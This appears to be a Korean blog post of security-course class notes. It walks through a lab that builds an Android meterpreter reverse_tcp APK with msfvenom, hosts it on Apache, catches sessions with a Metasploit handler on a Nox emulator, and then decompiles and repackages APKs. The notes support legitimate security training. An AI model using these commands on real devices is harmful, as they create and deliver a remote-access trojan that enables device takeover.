---
title: 취약점 진단 및 대응 실무 2日 / SeSAC 성동캠퍼스1기
snippet: "[클라우드 기반의 모빌리티 융합보안 과정] 취약점 진단 및 대응 실무 2日차 수업 정리한 내용입니다."
image: { src: "/assets/img/blog/cover-4.jpg", alt: "Cover Image 4" }
publishDate: "2023-11-21"
category: "security-vulnerability"
tags: [sesac,cloud,skshieldus,security-vulnerability]
---
* toc
{:toc}

<style>.embed-container { position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden; max-width: 100%; } .embed-container iframe, .embed-container object, .embed-container embed { position: absolute; top: 0; left: 0; width: 100%; height: 100%; }</style><div class='embed-container'><iframe src='https://www.youtube.com/embed/8eB-7l7ysX8' frameborder='0' allowfullscreen></iframe></div>

## 취약점 진단 및 대응 실무 / 4주차 2일자 수업

### 1. Kali Linux

#### 1-1. Kali Linux & Metasploit

> 先 3줄 요약<br>
> 1. Kali에서 apache2를 실행하여 외부에서 접속 가능한지 확인.
> 2. Kali에서 metasploit console을 실행하여 apk에 악성앱 탑재.
> 3. Nox에서 실행하고, Kali에서 session 확인하기.
{:.lead}

먼저 kali에서다음을 확입합니다.
1. vm 네트워크 NAT 설정
2. sudo service apache2 restart
	웹 페이지를 오픈
3. ip확인(ip addr, ifconfig)
{:.lead}

다음으로 Nox에서
1. 인터넷 브라우저로 ip에 접근하여 nox에서 kali로 접근되는지 확인

그리고 kali에서
1. msfvenom -p android/meterpreter/reverse_tcp LHOST=ip address LPORT=4444 R > apk 
2. sudo cp apk /var/www/html/ # 생성된 악성코드를 웹 배포
3. msfconsole # 메타스플로잇 콘솔 실행
4. use exploit/multi/handler # 핸들러 설정
5. set payload android/meterpreter/reverse_tcp # 페이로드 설정
6. set LHOST ip address # ip설정
7. set LPORT 4444 # 포트 설정
8. set exitonsession false 
9. exploit -j #실행

그리고 Nox에서
10. 인터넷 브라우저로 접근하여 apk설치

마지막으로 kali에서
1. sessions # 세션확인
2. sessions -i
3. sudo cp apk /var/www/html/apk.zip

```bash
tasklist | findstr Nox(nox handler)
netstat  -ano | pid
adb connect 127.0.0.1:62001 #Nox ip, port
```

### 2. Apk Decompile, Re-Package

APK 디컴파일 할 때 JAVA와 apktool이 요구됩니다. APK는 자바 -> 클래스 -> 덱스 -> smali -> java과 같은 구조를 지니고 있습니다.
{:.note}

```shell
java -jar apktool_2.5.0.jar d apk파일명 #d는 디컴파일을 의미
```

```shell
java -jar apktool_2.5.0.jar b apk파일명 #b는 리패키징
```

```shell
d2j-dex2jar.bat apk파일명 #jar파일 생성 = class
```
